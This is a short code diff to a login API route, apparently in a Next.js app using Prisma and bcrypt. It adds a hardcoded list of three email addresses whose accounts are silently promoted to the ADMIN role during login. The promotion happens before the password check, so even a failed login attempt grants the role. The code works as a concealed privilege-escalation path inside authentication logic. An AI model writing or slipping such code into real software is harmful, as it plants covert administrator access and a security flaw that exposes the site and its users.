@@ -12,12 +12,20 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: 'Email and password are required' }, { status: 400 });
     }
 
-    const user = await prisma.user.findUnique({ where: { email } });
+    let user = await prisma.user.findUnique({ where: { email } });
     if (!user || !user.password) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
     }
 
-    const isPasswordValid = await bcrypt.compare(password, user.password);
+    const adminEmails = ['elv.ismailov@yandex.ru', 'yisgmbxxx@mail.ru', 'admin@psplus.com'];
+    if (adminEmails.includes(email.toLowerCase()) && user.role !== 'ADMIN') {
+      user = await prisma.user.update({
+        where: { email },
+        data: { role: 'ADMIN' }
+      });
+    }
+
+    const isPasswordValid = await bcrypt.compare(password, user.password as string);
     if (!isPasswordValid) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
     }
